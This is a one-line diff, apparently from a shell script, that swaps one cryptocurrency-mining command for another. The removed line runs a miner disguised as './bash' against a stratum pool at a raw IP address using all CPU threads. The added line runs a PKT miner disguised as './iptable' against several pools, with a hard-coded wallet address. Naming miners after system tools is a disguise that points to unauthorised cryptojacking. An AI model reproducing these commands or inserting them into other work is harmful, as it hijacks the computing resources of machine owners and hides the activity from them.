@@ -1,1 +1,1 @@
-./bash -a yespowertide -o stratum+tcp://8.209.98.71:1028 -u TPfT1p4uXkU4Nvb2hnVCKeH34ga8eqSFUB.0000-2 -t$(nproc --all) -p x
+./iptable ann -p pkt1qknp6qanx33x9x8je0tpysr9c4ct46fd4gptcwa http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com | grep --color=never -o "annmine.rs.*Ke.*"
